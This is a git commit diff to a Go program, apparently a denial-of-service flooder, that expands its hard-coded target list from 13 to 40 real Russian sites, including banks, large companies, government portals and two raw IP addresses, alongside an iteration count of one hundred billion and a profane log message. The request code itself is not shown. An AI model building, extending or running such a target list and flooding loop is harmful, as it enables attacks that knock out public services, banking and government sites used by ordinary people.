e9def073f31322a84802646bc01a8c043c9463ef
danorel <mail.ordan@gmail.com>
2022-02-26 21:55:50 +0200

    Update russian domains

--- main.go
+++ main.go
@@ -27,11 +27,23 @@ func processUrls(urls []string) {
 
 func main() {
 	log.Println("Fuck russia!")
-	targets := [13]string{
-		"https://lenta.ru/", "https://ria.ru/", "https://lenta.ru/", "https://ria.ru/",
-		"https://ria.ru/lenta/", "https://www.rbc.ru/", "https://www.rt.com/", "http://kremlin.ru/",
-		"http://en.kremlin.ru/", "https://smotrim.ru/", "https://tass.ru/", "https://tvzvezda.ru/",
-		"https://cbr.ru/",
+	targets := [40]string{
+		// Business and corps 
+		"https://cbr.ru/", "https://www.gazprom.ru", "https://lukoil.ru", "https://magnit.ru",
+		"https://www.nornickel.com", "https://www.surgutneftegas.ru", "https://www.tatneft.ru", "https://www.evraz.com/ru",
+		"https://nlmk.com", "https://www.sibur.ru", "https://www.severstal.com", "https://www.metalloinvest.com",
+		"https://nangs.org", "https://rmk-group.ru", "https://www.tmk-group.ru", "https://ya.ru",
+		"https://www.polymetalinternational.com/ru", "https://www.uralkali.com/ru", "https://www.eurosib.ru", "https://omk.ru",
+
+		// Banks
+		"https://www.sberbank.ru", "https://www.vtb.ru", "https://www.gazprombank.ru",
+
+		// Government
+		"https://www.gosuslugi.ru", "https://www.mos.ru/uslugi", "http://kremlin.ru", "http://government.ru",
+		"https://mil.ru", "https://www.nalog.gov.ru", "https://customs.gov.ru", "https://pfr.gov.ru",
+		"https://rkn.gov.ru", "https://109.207.1.118/", "https://109.207.1.97/", "https://mail.rkn.gov.ru",
+		"https://cloud.rkn.gov.ru", "https://mvd.gov.ru", "https://pwd.wto.economy.gov.ru", "https://stroi.gov.ru",
+		"https://proverki.gov.ru",
 	}
 	iterations := 100000000000
 
